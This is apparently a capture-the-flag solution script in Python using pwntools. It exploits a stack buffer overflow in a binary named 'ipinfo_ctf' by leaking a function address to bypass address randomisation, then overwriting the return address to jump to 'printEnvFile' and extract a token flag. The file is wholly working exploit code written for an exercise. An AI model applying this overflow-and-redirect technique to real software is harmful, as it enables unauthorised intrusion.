#!/usr/bin/env python

from pwn import *
import re

binary = "./ipinfo_ctf"
REMOTE = True
host = "localhost"
port = 1234


# --- calculate the offset ---
if REMOTE == False:
	elf = ELF(binary)

	p = process(binary)
	p.sendline(cyclic(200, n=8))
	p.wait()

	core = p.corefile

	offset = cyclic_find(core.read(core.rsp, 8), n=8)
	info("the offset is %d", offset)

else:
	# write the offset manually if you are executing it remotely
	offset = 23
# ----------------------------


# --- exploit the program ---
exe = ELF(binary)

if REMOTE:
	r = remote(host, port)
else:
	r = exe.process()

r.recvline()
r.sendline(b"hello") # an error is forced
r.recvline()
executeCommand_returned = int(re.findall(r'\((.*?)\)', str(r.recvline()))[0], 16)
r.recvline()
info("The returned address of 'executeCommand' is %d", executeCommand_returned)

executeCommand = exe.symbols["executeCommand"]
printEnvFile = exe.symbols["printEnvFile"]
info("The address of 'executeCommand' is %d", executeCommand)
info("The address of 'printEnvFile' is %d", printEnvFile)

result_address = executeCommand_returned - executeCommand + printEnvFile
info("The result address is %d", result_address)

payload = b"A" * offset + p64(result_address)
info("The payload to send is %s", payload)

r.sendline(payload)
print(r.recvline())
token = re.findall(r"token\{[^{}]+\}", str(r.recvall()))
print()
print(token[0])
# ----------------------------
